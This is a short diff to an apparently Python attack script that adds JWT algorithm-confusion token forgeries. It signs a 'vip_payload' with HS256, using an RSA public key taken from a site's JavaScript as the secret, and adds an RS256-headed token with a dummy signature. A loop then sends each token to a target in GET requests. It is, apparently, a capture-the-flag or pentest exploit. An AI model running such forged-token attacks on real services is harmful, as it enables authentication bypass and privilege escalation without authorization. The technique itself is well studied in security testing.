@@ -101,6 +101,24 @@ jwts.append(
         + ".x",
     )
 )
+# 算法混淆: 用 JS 里的 RSA 公钥作为 HS256 密钥
+PUB_MOD = "wixnV3eKf2lGwraEJs0j0WVKRuv3iWz8sGaT/thwXyroRgKfTctjqinI1Kc+hn+TMhsUrnnJHbS8M9KZqK7QIDAQAB"
+PUB_PEM = (
+    "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA"
+    + PUB_MOD
+    + "\n-----END PUBLIC KEY-----"
+)
+jwts.append(("confuse-pem", make_jwt("HS256", vip_payload, PUB_PEM)))
+jwts.append(("confuse-mod", make_jwt("HS256", vip_payload, PUB_MOD)))
+jwts.append(
+    (
+        "confuse-rs256",
+        b64u(b'{"alg":"RS256","typ":"JWT"}')
+        + "."
+        + b64u(json.dumps(vip_payload).encode())
+        + ".x",
+    )
+)
 for name, t in jwts:
     st, b = req(
         "GET",
